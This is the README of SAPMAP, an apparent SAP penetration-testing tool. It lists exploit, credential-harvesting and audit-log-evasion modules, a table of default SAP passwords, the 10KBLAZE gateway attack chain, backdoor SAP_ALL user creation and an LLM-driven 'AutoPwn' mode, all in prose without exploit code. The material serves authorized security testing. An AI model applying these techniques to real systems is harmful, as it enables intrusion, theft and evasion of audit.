│   ├── sapmap_report.py               Engagement report — Markdown + self-contained HTML (KPIs, SVG landscape map, structural recommendations)
│   ├── sapmap_diff.py                 Diff between two .sapmap snapshots (Markdown + HTML)
│   ├── sapmap_gui.py                  Bottle HTTP server — 60+ REST API routes
│   └── sapmap_html.py                 Single-page web application (HTML/CSS/JS)
│
├── automation/
│   └── sapmap_script.py               YAML / JSON script runner for repeatable scenarios
│
├── mcp/
│   └── sapmap_mcp_server.py           Model Context Protocol server for LLM-driven operation
│
├── protocols/                         Low-level SAP protocol primitives
│   ├── sap_rfc_ctypes.py              ctypes wrapper for SAP NW RFC SDK
│   ├── sap_rfc_system_info.py         Unauthenticated RFC_SYSTEM_INFO probing
│   ├── sap_rsec_cipher.py             SAP RSECCipher — proprietary 8-round Feistel 3DES
│   ├── sap_router_info.py             SAProuter ROUTER_ADM info request
│   ├── sap_saprouter.py               SAProuter NI_ROUTE tunnel
│   ├── sap_soap_envelopes.py          SOAP-RFC envelope builders + ElementTree response parser
│   │                                   (RFC_PING, RFC_GET_SYSTEM_INFO, RFC_READ_TABLE,
│   │                                    DEST_CHECK_CONNECTION, SXPG_STEP_XPG_START,
│   │                                    RFC_ABAP_INSTALL_AND_RUN, BAPI_USER_*)
│   └── sap_soap_basic.py              SOAPRFCSession — HTTP basic-auth SOAP-RFC client.
│                                       Auto-fallback for firewalled gateways; drop-in
│                                       shape for sapmap_rfc dispatcher
│
├── discovery/                         Network discovery + recon
│   ├── sapmap_scanner.py              Fast/deep scan, SAPControl, RFC probing
│   ├── sapmap_rfc.py                  Authenticated RFC operations — BAPI, table reads, dest mgmt
│   ├── sap_client_enum.py             DIAG client enumeration
│   ├── sap_default_creds.py           Default SAP credential scanner via DIAG
│   ├── sapmap_scc_fingerprint.py      SCC TLS / HTTP / favicon fingerprint ladder
│   ├── sapmap_scc_cve_buckets.py      Version → CVE lookup for fingerprinted SCC instances
│   └── sapmap_scc_relay.py            Reachability probe for SCC mappings
│
├── exploitation/                      Initial-access exploits + RCE primitives
│   ├── sapmap_exploit.py              Umbrella orchestrator (re-exports from siblings below)
│   ├── sap_cve_2020_6287.py           RECON unauth user create
│   ├── sap_cve_2025_31324.py          VisualComposer JSP webshell
│   ├── sap_ms_betrusted.py            Message Server betrusted (10KBLAZE) — protocol layer
│   ├── sap_betrusted_chain.py         Full 10KBLAZE chain: betrusted → GW trust → user create
│   ├── sap_gw_xpg_standalone.py       Standalone Gateway SAPXPG client
│   ├── sap_db_sql_writers.py          GW-SAPXPG database SQL writers (HANA / MSSQL / Oracle / MaxDB)
│   ├── sap_ransapware.py             RanSAPware Awareness PoC — table data encryption/decryption
│   ├── sap_java_ctc.py                Java CTC ConfigServlet deploy
│   ├── sap_java_telnet.py             Java telnet console deploy
│   └── sapmap_copyfail.py             CVE-2026-31431 root LPE on Linux (page-cache patch) — validated on SLES 11 + 15 + 6.4.0
│
├── postex/                            Post-exploitation: privesc + lateral movement + evasion
│   ├── sapmap_lpe.py                  ABAP local privilege escalation registry
│   ├── sap_ume_user_create.py         Java UME admin user creation
│   ├── sapmap_chain.py                Multi-hop RFC trust-chain analysis
│   ├── sap_ssh_lateral.py             SSH key harvest, lateral movement, OS Console/shell via SSH
│   ├── sap_pse_loot.py               SAPSYS.pse + cred_v2 extraction with chunked binary reads
│   ├── sapmap_evasion_baseline.py     Tier 3 baseline capture + SAL config readers/writers
│   ├── sapmap_evasion_tier3.py        Tier 3 technique entry points (SAL slot disable, param set, Java SAL suppress, DBTABLOG purge)
│   ├── sap_java_logctl.py            Java SAL LogController JSP — deploy, invoke, baseline/restore via HTTP
│   └── sap_dbtablog_purge.py         DBTABLOG MAX(LOGID) baseline + DELETE via RFC_ABAP_INSTALL_AND_RUN
│
├── data_extraction/                   Credential / data harvesting
│   ├── sapmap_secstore.py             ABAP RSECTAB / SSFS decryption + map integration
│   ├── sap_java_secstore.py           Java SecStoreFS via dropped JSP
│   ├── sap_java_secstore_runner.py    Java Secure Store extraction orchestrator (deploys JSP, decrypts entries, plots downstream creds)
│   ├── sap_java_secstore_offline.py   Pure-Python Java SecStore decrypt (3DES era)
│   ├── sap_java_runner.py             Java DB / data extraction (download_java_table, extract_java_password_hashes, assess_java_impact, read_java_destinations) + _wait_for_jsp_ready helper for the Tomcat / Jasper compile race
│   ├── sap_java_db.py                 JDBC dump + UME hashes via JSP
│   ├── poc_remote_abap_exec.py        XBP job-scheduling RCE for SQL extraction
│   ├── sapmap_scc_admin.py            SCC authenticated REST helpers
│   ├── sapmap_scc_keystore.py         SCC backup zip parsing + keystore extraction
│   ├── sapmap_scc_ssfs_decrypt.py     SCC SSFS decryption (JNI helper + on-host fallback)
│   └── sap_scc_harvest.py             SCC post-RCE harvest (ARP sweep, SSH key hunt, mappings exfil)
│
├── business_impact/
│   ├── sapmap_impact.py               ABAP-RFC business impact scenarios
│   └── sap_java_impact.py             Java equivalent (J2EE_CONFIGENTRY-driven)
│
└── ops/
    └── sapmap_cleanup.py              Cleanup — delete users, remove destinations
```

The `modules/__init__.py` registers each subpackage on `sys.path` so existing flat imports (`import sapmap_models`, `from sap_rfc_ctypes import ...`) continue to work.

### Loot vs State directories

- **`states/`** — session state files: `.sapmap` autosaves, RFC check cache, destination log
- **`loot/`** — downloaded artefacts, organised by category (gitignored):
  - `loot/hashes/` — ABAP BCODE/PASSCODE/PWDSALTEDHASH dumps + Java UME hashes + SecStore configentry secrets, both as raw JSON and ready-to-crack hashcat files
  - `loot/secstore/` — decrypted ABAP RSECTAB and Java SecStoreFS entries (JSON)
  - `loot/tables/` — ABAP and Java DB table dumps (JSON / CSV)
  - `loot/bia/` — Business Impact Assessment exports per scenario (CSV)
  - `loot/scc/<host>/` — SCC backup zips, decrypted SSFS secrets, cracked passwords

### Key Data Models

| Model | Purpose |
|-------|---------|
| `SAPNode` | An SAP system: SID, type, instances, ports, credentials, findings, position on map |
| `RFCConnection` | An RFC link between two systems: destination name, user, profiles, SAP_ALL status, risk level |
| `CreatedUser` | A user created by SAPMAP: username, method (gw_exploit/bapi/sxpg), password, timestamp |
| `SAPMAPState` | The full session: all nodes, connections, created users, scan config |

---

## Installation

### Requirements

- **Python 3.8+**
- The Python packages listed below (all required — see `requirements.txt`)
- **SAP NetWeaver RFC SDK** — strongly recommended for a real engagement; enables the entire authenticated attack surface

### Python packages (all required)

| Package | Minimum | Used for |
|---|---|---|
| `bottle` | 0.12 | Embedded HTTP server that powers the GUI |
| `pywebview` | 4.0 | Native desktop window (falls back to a browser tab if the platform can't spawn it) |
| `requests` | 2.28 | HTTP client for CVE checks, LPE, Java exploits, BTP token exchange |
| `urllib3` | 1.26 | TLS-warning suppression + underlying transport for `requests` |
| `pycryptodome` | 3.18 | DES/3DES + PBKDF2 for SecStore (RSECTAB) decryption on both ABAP and Java |
| `pyyaml` | 6.0 | YAML parser for scripted scenarios (`--script foo.yaml`) |

### Optional Python packages

| Package | Enables | Why it's optional |
|---|---|---|
| `pyjks` (≥ 20) | OFFLINE 3DES Java-SecStore decrypt path | Pulls in `twofish==0.3.0` (2013), which has no wheels for Python 3.12+ and fails to build cleanly on modern envs.  The JSP / server-side path works without it, so a fresh install can skip pyjks and still cover Java SecStore. |
| `hdbcli` (≥ 2.19) | DBCON direct-DB pivot to external HANA — after SecStore decrypt SAPMAP pairs `/DBCON/<name>` passwords with the DBCON table, connects to the external HANA over the wire, fingerprints whether it is SAP-shape (USR02 present) and can plant SAPMAP00 via direct SQL. | SAP's official HANA driver is a hefty native package that is only useful when the target actually has an external HANA DB defined in DBCON.  Without it the DBCON edges still show up on the map but "Test Connection" reports "hdbcli not installed".  MSSQL / Oracle / DB2 / MaxDB drivers will follow in v2 (`pyodbc`, `oracledb`, `ibm_db`, `pymaxdb`). |

Install optional extras with `pip install pyjks hdbcli` when you need them — or use the Docker image below, which bakes them in.

### Setup

> [!NOTE] 
> It is recommended to use a virtual Python environment to avoid any dependency conflicts with other packages already installed on your machine. 

```bash
git clone https://github.com/kloris/SAPMAP.git
cd SAPMAP

# Setup a virtual Python environment
python3 -m venv .venv
source .venv/bin/activate

# Install the dependencies
pip3 install -r requirements.txt

# run SAPMAP
python3 sapmap.py
```

### Docker (recommended if you keep hitting install pain)

The container image bundles every Python dependency (including the tricky `pyjks` / `twofish` chain) so you don't have to negotiate Python 3.12 build breakage.  The SAP NW RFC SDK stays on the host (SAP EULA — cannot ship it) and gets bind-mounted at run time.

**Prerequisites (any platform):**

- Docker (or Podman aliased to `docker`) — Docker Desktop is fine on macOS / Windows; native `docker` on Linux.
- The **Linux x86-64** variant of the NW RFC SDK from SAP Software Center, extracted to a folder on your host (e.g. `~/nwrfcsdk/` or `/opt/nwrfcsdk/`).  Even on macOS and Windows hosts you need the *Linux* SDK — the container runs Linux Python and can't load a macOS `.dylib` or Windows `.dll`.
- First build takes ~5–10 min (the `twofish` C extension is slow to compile inside `pyjks`).  Subsequent builds are cached and take seconds.

**Easiest path — use the wrapper:**

```bash
SDK_PATH=~/nwrfcsdk ./scripts/run-container.sh
```

The wrapper auto-detects Linux vs macOS, arm64 vs x86-64, sets `--platform linux/amd64` where needed, and mounts everything correctly.  Env vars: `SDK_PATH`, `IMAGE`, `LOOT_DIR`, `STATE_DIR`.  Add `DEBUG=1` to print the exact `docker run` command the wrapper is about to execute (handy for troubleshooting).

**Manual — Linux:**

```bash
docker build -t sapmap:latest .

docker run --rm -it \
    --network host \
    --mount type=bind,source=/opt/nwrfcsdk,target=/opt/nwrfcsdk,readonly \
    --env SAPMAP_HOST_SDK_PATH=/opt/nwrfcsdk \
    --mount type=bind,source=$(pwd)/loot,target=/opt/sapmap/loot \
    --mount type=bind,source=$(pwd)/states,target=/opt/sapmap/states \
    sapmap:latest
```

**Manual — macOS (Docker Desktop), including Apple Silicon:**

The SAP NW RFC SDK is Linux x86-64 only, so `--platform linux/amd64` is required at both build and run time on Apple Silicon (runs under Rosetta 2).  macOS Docker Desktop doesn't support `--network host` — use `-p 8080:8080` instead.

```bash
docker build --platform linux/amd64 -t sapmap:latest .

docker run --platform linux/amd64 --rm -it \
    -p 8080:8080 \
    --mount type=bind,source=$HOME/nwrfcsdk,target=/opt/nwrfcsdk,readonly \
    --env SAPMAP_HOST_SDK_PATH=$HOME/nwrfcsdk \
    --mount type=bind,source=$(pwd)/loot,target=/opt/sapmap/loot \
    --mount type=bind,source=$(pwd)/states,target=/opt/sapmap/states \
    sapmap:latest
```

Then open `http://127.0.0.1:8080` in your host browser.

**Ephemeral vs. persistent — and why the Docker Desktop "Run" button doesn't work:**

The default `docker run --rm` deletes the container as soon as you stop it, so it never appears in the Docker Desktop "Containers" list — only the image survives.  Hitting the ▶️ button on the image in Docker Desktop then starts a brand-new container **without** the port mapping, volume mounts, or `--platform` flag that SAPMAP needs, so it either binds an unreachable port, crashes on the missing SDK bind mount, or (on Apple Silicon) fails to load the x86-64 SDK because Rosetta wasn't requested.  In short: the dashboard's "Run image" button is not the right entry point for this container.

Two fixes, pick one:

1. **Run the wrapper in persistent mode** — the container gets a fixed name, survives stop, and Docker Desktop's Start/Stop buttons on the **Containers** tab then work correctly:

    ```bash
    PERSIST=1 SDK_PATH=~/nwrfcsdk ./scripts/run-container.sh    # first run
    docker start -ai sapmap                                     # bring back up
    docker stop  sapmap                                         # clean stop
    docker rm    sapmap                                         # throw it away
    ```

    Re-running `PERSIST=1 ./scripts/run-container.sh` after a stop just re-attaches to the existing `sapmap` container (script detects state=exited and does `docker start -ai`).  Use `NAME=sapmap-dev PERSIST=1 …` to keep more than one around side-by-side.

2. **Docker Compose** — if you prefer Docker Desktop's stack UI, drop this into `docker-compose.yml` at the repo root and hit ▶️ on the stack:

    ```yaml
    services:
      sapmap:
        image: sapmap:latest
        platform: linux/amd64          # comment out on Intel/Linux hosts
        container_name: sapmap
        ports:
          - "8080:8080"
        environment:
          - SAPMAP_HOST_SDK_PATH=${HOME}/nwrfcsdk
        volumes:
          - ${HOME}/nwrfcsdk:/opt/nwrfcsdk:ro
          - ./loot:/opt/sapmap/loot
          - ./states:/opt/sapmap/states
        stdin_open: true
        tty: true
    ```

    Then `docker compose up` (or Docker Desktop → Compose stack → Start).

**Verify it's working:**

Three checks worth running in a second terminal while the container is up:

```bash
# 1. Container is running
docker ps

# 2. SDK loads under Rosetta (Apple Silicon) / natively (Intel/Linux)
docker exec <container-id> python3 -c \
    "from ctypes import CDLL; CDLL('/opt/nwrfcsdk/lib/libsapnwrfc.so'); print('SDK loads OK')"

# 3. Target reachability from inside the container (replace 192.168.x.y)
docker exec <container-id> python3 -c \
    "import socket; socket.create_connection(('192.168.x.y', 3200), timeout=3); print('reachable')"
```

**LAN reachability — tested and it works on macOS Docker Desktop.**  Contrary to the caveats often given for Docker Desktop, LAN scans against arbitrary hosts on the operator's home network *do* work end-to-end with bridge networking + `-p 8080:8080`.  Verified against a real S/4 landscape from an Apple Silicon MacBook.  You may still hit VPN / corporate-network cases where Docker Desktop's NAT isolates the container — the `docker exec … socket.create_connection` check above tells you in one line.

**Lessons from real testing:**

- **Directory names with colons break the older `-v HOST:CONTAINER` syntax.**  Docker splits `-v` values on `:`, so a working directory like `~/Research/SAPmap:SAPology/SAPMAP` reads as three colon-separated fields and Docker rejects it with `invalid mode: /opt/sapmap/loot`.  The Dockerfile examples above (and the wrapper) all use `--mount type=bind,source=…,target=…` which uses named fields and is immune to this.  If you must use `-v`, keep colons out of your working directory path.
- **Hard-reload the browser (⌘⇧R on macOS, Ctrl+F5 on Windows/Linux) after re-building or pulling GUI changes.**  SAPMAP's HTML/JS is served from the Bottle app; browsers cache it aggressively and stale JS can hide legitimate fixes.
- **In-container, the SDK modal is read-only.**  `settings.local.json` inside a `--rm` container disappears on exit, and the entrypoint sets `--sdk /opt/nwrfcsdk/lib` on every start anyway.  The modal reflects this: it shows the active container path plus the bind-mount host source, and directs you to restart with a different `SDK_PATH` env var if you want to change SDK.
- **First `pip install pyjks` layer is slow (~5 min).**  If your build hangs there, that's expected — the twofish C extension is compiling.
- **`loot/` and `states/` bind mounts survive container restart.**  Findings, reports, and `.sapmap` snapshots you save land on the host filesystem, not inside the container.

**Other notes:**

- The image runs in `--browser` mode; `pywebview` cannot spawn a desktop window from inside a container.
- The image binds to `0.0.0.0` inside the container.  With `--network host` on Linux that resolves to your real network interfaces — do **not** run this on an untrusted network.
- Publishing a pre-built image to a registry is a follow-up (see issue tracker).

### SAP NW RFC SDK (strongly recommended)

The NW RFC SDK is a native SAP library (not a PyPI package) that enables **most** of what makes SAPMAP useful in an authorized engagement:

- Authenticated BAPI calls — user creation, profile assignment, `BAPI_USER_GET_DETAIL`
- Full RFC destination retrieval from RFCDES / RFCTRUST / RFCSYSACL
- SecStore (RSECTAB) extraction on ABAP + Java
- Local privilege escalation (`bapi_profiles_assign`, `webgui_rsbdcos0`)
- MYSAPSSO2 ticket forgery + fanout
- dpmon virtual SAP\* activation
- OA2C profile mining for BTP token pivots
- Kernel-proxied HTTP-over-RFC for cert-authenticated destinations
- Death Star (SAL suppressor) deployment

Without it you're limited to unauthenticated features only (port scan, gateway exploit fingerprint, SAPControl SOAP, RFC_SYSTEM_INFO leak) — most engagement value is behind the SDK.

**Install:**

Instructions per OS below.  In all cases the last step is to tell SAPMAP where the SDK's `lib/` directory lives — three options, first non-empty wins:

- `--sdk <path>` on the CLI (per-run override — path is OS-specific: `/opt/nwrfcsdk/lib` on Linux/macOS, `C:\nwrfcsdk\lib` on Windows)
- **Actions → 📁 Set NW RFC SDK Path** in the GUI (persisted to `settings.local.json`, gitignored) — the recommended way to set it once and never type `--sdk` again.  Live-applied to the running session so no restart is needed after saving.
- Nothing set — SAPMAP falls back to the OS loader's search path (`LD_LIBRARY_PATH` on Linux, `DYLD_LIBRARY_PATH` on macOS, `PATH` on Windows)

#### Linux

1. Download from SAP Software Center (requires S-user access — SAP does not distribute the SDK publicly).  Pick the Linux x86-64 variant.
2. Extract to e.g. `/opt/nwrfcsdk/`.
3. Point the loader at the `lib/` directory (only needed if you plan to use the LD-based fallback rather than `--sdk` / the GUI setting):
   ```bash
   export LD_LIBRARY_PATH=/opt/nwrfcsdk/lib:$LD_LIBRARY_PATH
   ```
4. Verify: `ls /opt/nwrfcsdk/lib/libsapnwrfc.so`.

#### macOS

1. Download the macOS variant from SAP Software Center.
2. Extract to e.g. `/opt/nwrfcsdk/`.
3. Point the loader at the `lib/` directory:
   ```bash
   export DYLD_LIBRARY_PATH=/opt/nwrfcsdk/lib:$DYLD_LIBRARY_PATH
   ```
4. macOS quarantine may block unsigned SAP dylibs — if the RFC probe reports "cannot load library", `xattr -dr com.apple.quarantine /opt/nwrfcsdk` clears it.

#### Windows

1. Download the Windows x86-64 variant from SAP Software Center (typically a `NWRFC_*.SAR` archive).  SAR files are extracted with `SAPCAR.EXE` (also on SAP Software Center):
   ```powershell
   .\SAPCAR.EXE -xvf NWRFC_75-70003216.SAR -R C:\nwrfcsdk
   ```
2. The archive contains a top-level `nwrfcsdk\` folder — you should end up with `C:\nwrfcsdk\lib\sapnwrfc.dll` (plus `libsapucum.dll`, `icuuc50.dll`, `icudt50.dll`, `icuin50.dll`).
3. Add the `lib` directory to your user or system `PATH` so the Windows loader can find the DLLs:
   ```powershell
   # PowerShell (per-user PATH, requires new shell to take effect):
   setx PATH "$env:PATH;C:\nwrfcsdk\lib"
   ```
   Or via the GUI: *System Properties → Environment Variables → PATH → Edit → New → `C:\nwrfcsdk\lib`*.
4. The SDK's DLLs are built against the **Microsoft Visual C++ 2013 Redistributable (x64)** — install it from Microsoft's download center if it isn't already present.  Missing VC++ redist manifests as a `126 (module not found)` load error even when the DLL path is correct.
5. Tell SAPMAP where the `lib` directory is — either `--sdk C:\nwrfcsdk\lib` on the CLI, or set it once via **Actions → 📁 Set NW RFC SDK Path** in the GUI (persisted to `settings.local.json`).

**Windows troubleshooting:**

| Symptom | Likely cause | Fix |
|---|---|---|
| `Cannot load library sapnwrfc.dll` on startup | `PATH` doesn't include `C:\nwrfcsdk\lib`, OR a new PowerShell wasn't opened after `setx` | Open a fresh terminal.  Verify with `where.exe sapnwrfc.dll`. |
| `Error 126: The specified module could not be found` (with sapnwrfc.dll in PATH) | Missing Visual C++ 2013 Redistributable | Install `vcredist_x64.exe` from Microsoft. |
| `Error 193: %1 is not a valid Win32 application` | 32-bit SDK on 64-bit Python (or vice-versa) | Match SDK bitness to your Python — `python -c "import struct; print(struct.calcsize('P')*8)"` reports 64 or 32. |
| RFC probe succeeds but SAPMAP's Anti-Virus scanner quarantines it | AV flags SAPMAP's exploit primitives (10KBlaze, betrusted, VisualComposer shell) | See the **Anti-Virus** section below. |

### Anti-Virus

Some AV software (especially on Windows systems) might flag SAPMAP as being malicious. This is a.o. because SAPMAP includes functionality for a reverse- or bind-shell and contains some well-known exploits. Accepting these risks might be needed to have SAPMAP properly functioning on Windows based systems.

---

## Usage

### Launch the GUI

```bash
python3 sapmap.py                                    # Auto-detect: pywebview or browser
python3 sapmap.py --browser                          # Force browser mode
python3 sapmap.py --port 8080                        # Custom port
python3 sapmap.py --load states/my_landscape.sapmap  # Resume a saved session
python3 sapmap.py --sdk /opt/nwrfcsdk/lib            # Set NW RFC SDK path
python3 sapmap.py --script scripts/demo_10kblaze.yaml  # Run scripted scenario with GUI
```

### CLI Options

| Option | Description |
|--------|-------------|
| `--load FILE` | Load a saved `.sapmap` state file |
| `--sdk PATH` | Path to SAP NW RFC SDK lib directory |
| `--sapology PATH` | Path to the SAPology checkout for Deep Scan (default: `../SAPology`) |
| `--port PORT` | HTTP server port (0 = auto-select) |
| `--script FILE` | Run a scripted scenario (YAML/JSON) with GUI visualization ([details](#scripted-scenarios)) |
| `--browser` | Force browser mode (skip pywebview) |
| `--no-gui` | Server only — open browser manually |
| `--targets TARGETS` | Scan targets (CLI mode, implies --no-gui) |
| `--fast` | Fast scan mode (default) |
| `--deep` | Deep scan mode (full SAPology) |
| `--mcp` | Launch MCP server alongside GUI for LLM-driven operation ([details](#mcp-server)) |
| `-v, --verbose` | Verbose output |
| `--debug` | Enable debug logging |

---

## Web GUI

The web interface is a single-page application with an interactive SVG map.

### Map Interaction

| Action | Effect |
|--------|--------|
| **Drag node** | Reposition a system on the map |
| **Left-click node** | Show system info panel |
| **Right-click node** | Open system context menu |
| **Right-click background** | Open global actions menu |
| **Hover connection** | Show RFC connection details |
| **Mouse wheel** | Zoom in/out |
| **Ctrl+S** | Save state |

### System Context Menu

| Action | Description |
|--------|-------------|
| RFC System Info | Unauthenticated system probing (SID, OS, DB, kernel) |
| Deep Scan | Full SAPology vulnerability assessment |
| Set/Test Credentials | Manage authentication for the system |
| Retrieve RFC Connections | Map all RFC destinations (via RSRFCCHK) |
| Test RFC Destinations | Validate all discovered connections |
| Check Gateway | Test SAPXPG vulnerability |
| Check Default Accounts | ⚠️ Test 16 default SAP credentials via DIAG (may lock accounts!) |
| Create User (GW Exploit) | Unauthenticated user creation via gateway |
| Create User (BAPI) | Authenticated user creation |
| Try Local Privilege Escalation | Assign SAP_ALL to current user (tries BAPI, then WebGUI SQL) |
| Propagate | Exploit RFC links to reach other systems |
| Download Hashes | Extract USR02 password hashes (BCODE/PASSCODE/PWDSALTEDHASH) |
| Download SecStore | Decrypt RSECTAB — extract RFC/DB/CTS/SMTP passwords |
| Download Table | Read arbitrary SAP table data |
| Set OS/DB/System Type | Manual override for detection gaps |
| Set SAProuter | Configure SAProuter route string for this system |
| Cleanup Users | Delete all SAPMAP-created users |
| Delete System | Remove from the map |

### Map Background Menu

| Action | Description |
|--------|-------------|
| ⚡ **AutoPwn** | One-click full-landscape convergence loop — scan, exploit, enrich, propagate across all systems until no new pwns (see [AutoPwn section](#autopwn--full-landscape-convergence-loop)) |
| Add System Manually | Add a system by IP/hostname (with optional SAProuter) |
| Set Default Password | Change SAPMAP00 password for this session |
| Auto-Propagate All | Propagate from all compromised systems |
| Check All GW Vulnerabilities | Test gateway exploit on all systems with 2+ nodes |
| Cleanup All Users | Delete all created users across all systems |
| Fit to Window | Auto-zoom to fit all systems |
| Reset Layout | Rearrange all systems |

The same **⚡ AutoPwn** entry is also available in the top **Actions** dropdown.

### Visual Indicators

| Element | Meaning |
|---------|---------|
| Green border | Normal system |
| Dark red border | Critical findings or vulnerable gateway |
| Red-tinted fill | Production system |
| Orange-tinted fill | Non-production system |
| Red connection line | RFC destination with SAP_ALL |
| Blue connection line | Regular RFC connection |
| Orange connection line | Gateway exploit path |
| Lightning bolt icon | System is compromised (pwned) |
| 🔗 via SAProuter | System is accessed through SAP Router proxy |
| PRD bar (red) | Production system detected |
| Non-PRD bar (orange) | Clients found, no production client |
| "Clients found" bar | Clients enumerated, roles not yet retrieved |
| SecStore Pwd indicator | Decrypted password available on RFC connection (click to reveal) |

---

## Scanning

### Fast Scan (default)

Scans dispatcher ports (32XX) and gateway ports (33XX) across the instance range 00–99:

```
Target: 10.0.0.0/24
Ports checked per host: 3200-3299 (dispatcher), 3300-3399 (gateway)
```

For each discovered system, SAPMAP automatically:
1. Probes RFC_SYSTEM_INFO (unauthenticated) to get SID, hostname, OS, DB type, kernel
2. Falls back to SAPControl SOAP API for SID, DB type, system type (ABAP/JAVA)
3. Falls back to SAPControl GetProcessList for OS type detection (.EXE = Windows)
4. Scans database ports (HANA 3XX13, MaxDB 7210, MSSQL 1433, Oracle 1521, DB2 50000)
5. Enumerates clients via DIAG protocol

### Deep Scan

Uses [SAPology](https://github.com/kloris/SAPology) for comprehensive port scanning, service fingerprinting, and vulnerability assessment including SSL/TLS checks, MS ACL testing, and CVE detection.

**SAPology is a sister project and is not bundled with SAPMAP** — you have to clone it separately.  SAPMAP looks for it as a **sibling directory** of the SAPMAP checkout (not inside it):

```
<workspace>/
├── SAPMAP/         ← this repo
└── SAPology/       ← clone side-by-side
```

Install:

```bash
cd <parent-directory-of-SAPMAP>
git clone https://github.com/kloris/SAPology.git
pip3 install -r SAPology/requirements.txt
```

**Custom SAPology location:** the default `../SAPology` sibling can be overridden — first non-empty wins:

1. `--sapology PATH` on the CLI (per-run override)
2. `$SAPMAP_SAPOLOGY_PATH` environment variable (handy in Docker)
3. `sapology_path` in `settings.local.json` (set via the GUI settings modal — live-applied)
4. Default sibling directory (no config needed)

If SAPology is missing when you launch a Deep Scan, SAPMAP prints `[!] SAPology unavailable: …` followed by the sibling directory it expected, then downgrades to the Fast Scan path — the scan still succeeds, but you lose the vulnerability assessment layer.

**Troubleshooting: `module 'SAPology' has no attribute 'discover_systems'`**

This means `import SAPology` succeeded but pulled in an empty namespace directory instead of the real project.  Almost always one of:

1. **SAPology was cloned *inside* SAPMAP** (as `SAPMAP/SAPology/`) rather than **beside** it.  Python 3.3+ treats any bare directory on `sys.path` as an empty namespace package, so the wrong `SAPology/` gets imported.  Fix by moving the clone up one level so the two repos are siblings — see the directory diagram above.
2. **GitHub ZIP download** left the folder named `SAPology-main`.  SAPMAP looks for a folder literally named `SAPology`.  Rename it: `mv SAPology-main SAPology`.
3. **Case mismatch** — `sapology/` on macOS's case-insensitive filesystem imports fine but from an unexpected location.  Keep the exact spelling `SAPology`.

SAPMAP now prints the full path it tried and where the wrong `SAPology` was loaded from, which makes the mis-location obvious in the console.

**Docker note:** the container ships with Fast Scan only.  Deep Scan inside a container needs a bind-mount of the SAPology tree; the target path can be anywhere on the container filesystem because `$SAPMAP_SAPOLOGY_PATH` tells the scanner where to look.  Simplest form:

```bash
--mount type=bind,source=/path/to/SAPology,target=/opt/SAPology,readonly \
--env SAPMAP_SAPOLOGY_PATH=/opt/SAPology
```

or as a Compose volume:

```yaml
volumes:
  - /path/to/SAPology:/opt/SAPology:ro
environment:
  - SAPMAP_SAPOLOGY_PATH=/opt/SAPology
```

SAPology's own Python deps must already be installed in the image — either add them to `requirements.txt` before build, or `pip install -r /opt/SAPology/requirements.txt` inside the running container.

---

## Default Account Detection

Right-click a system → Scanning → **⚠️ Check Default Accounts**

> **WARNING**: Failed login attempts may lock SAP accounts. A confirmation dialog is shown before testing.

Tests 16 well-known default SAP credentials via DIAG protocol (dispatcher port 32XX):

| Severity | Username | Default Password | Clients |
|----------|----------|-----------------|---------|
| CRITICAL | SAP* | 06071992 | All |
| CRITICAL | SAP* | PASS | All |
| CRITICAL | DDIC | 19920706 | All |
| CRITICAL | IDEADM | admin | All |
| HIGH | EARLYWATCH | SUPPORT | 066 |
| MEDIUM | TMSADM | PASSWORD | All |
| HIGH | SMD_ADMIN | init1234 | All |
| HIGH | SOLMAN_ADMIN | init1234 | All |
| ... | *(16 combinations total)* | | |

**Safety features:**
- Sequential testing (no parallel requests) to minimize lockout risk
- Automatically stops testing a user after it's detected as locked
- Skips non-dialog users (SAP doesn't verify password for these)
- Confirmed credentials are automatically added to the system's credential list

**Result classification:**
- `SUCCESS` — Full login worked
- `PASSWORD_CHANGE` — Password correct but expired
- `NO_AUTH_LOGON` — Password correct but no dialog authorization
- `USER_LOCKED` — User is locked (skips further attempts)

---

## Exploitation

### Gateway SAPXPG Exploit (Unauthenticated) — 10KBlaze / CVE-2020-6207

The 10KBLAZE technique exploits the unauthenticated SAP Message Server internal port to register a fake application server, which injects the attacker's IP into the SAP Gateway's trusted host list. Once trusted as "internal", the attacker can execute OS commands via the SAPXPG external program interface without authentication.

**Attack chain:**

```
1. betrusted    → Register fake app server with MS (port 39XX)
2. NILIST reply → MS propagates attacker IP to GW trust list
3. SAPXPG P1    → GW_NORMAL_CLIENT registration
4. SAPXPG P2    → F_SAP_INIT (now trusted as "internal")
5. SAPXPG P3    → SAPXPG_START_XPG — execute OS command
6. SAPXPG P4    → SAPXPG_END_XPG — retrieve command output
```

**Prerequisites on the target system:**

| Requirement | Detail |
|---|---|
| MS ACL | `HOST=*` in `ms_acl_info` (or at least allows attacker IP to register) |
| MS internal port | Port `39XX` (XX = instance number + 1 for ASCS) must be reachable through any firewall |
| `system/secure_communication` | Must be `OFF` (default) — when `ON`, the MS requires SNC for internal connections |
| `gw/reg_no_conn_info` | Must be `0` — controls whether the GW accepts NILIST trust propagation from registered servers. Default is `1` (blocked) on hardened systems (SAP Note 2408073) |
| Gateway secinfo ACL | Must allow `USER-HOST=internal` traffic (the 3 default rules suffice: `P USER=* USER-HOST=internal HOST=local TP=*`) |

> **Note:** The auto-derived server name preserves dots in the IP address (e.g. `192.168.2.210_S4H_00_a3f5`) so that SAP's `gethostbyname()` resolves the IP directly — no `/etc/hosts` modification is needed on the target. However, systems that had a failed reverse DNS lookup cached (NiHLGetNodeAddr) before the hosts file was updated will need a full instance restart to clear the cache.

**Confirmed working on:**

| System | Kernel | OS | Result |
|---|---|---|---|
| S4H | 793 | Linux | `uid=1001(s4hadm)` |
| TWT | 753 | Windows | `twtestenv1\sapservicetwt` |
| W74 | 742 | Windows | `winwas740\sapservicew74` |

SAPMAP uses this to run SQL commands that create a user directly in the database:

| Database | Method |
|----------|--------|
| HANA | Write SQL to temp file via python3, execute with `hdbsql -I` |
| MaxDB | Write SQL to temp file via python, execute with `sqlcli -i` |
| MSSQL | Execute `sqlcmd -Q` with inline SQL |
| Oracle | Pipe SQL to `sqlplus` via `/bin/sh -c` |
| DB2 | Execute `db2` CLI with inline SQL |

The created user (SAPMAP00) gets:
- Pre-computed password hashes (BCODE + PASSCODE, CODVN=G)
- SAP_ALL and SAP_NEW profiles
- Service user type (USTYP=S)
- Reference user DDIC
- Full authorization object entries (S_RFC, S_TCODE, S_USER_GRP, etc.)

### BAPI User Creation (Authenticated)

When credentials are available, SAPMAP creates users via standard BAPI function modules:

1. `BAPI_USER_CREATE1` — Create the user with USTYP=S
2. `BAPI_USER_PROFILES_ASSIGN` — Assign SAP_ALL + SAP_NEW profiles
3. `BAPI_USER_GET_DETAIL` — Verify the user was created successfully

### RFC Destination Testing

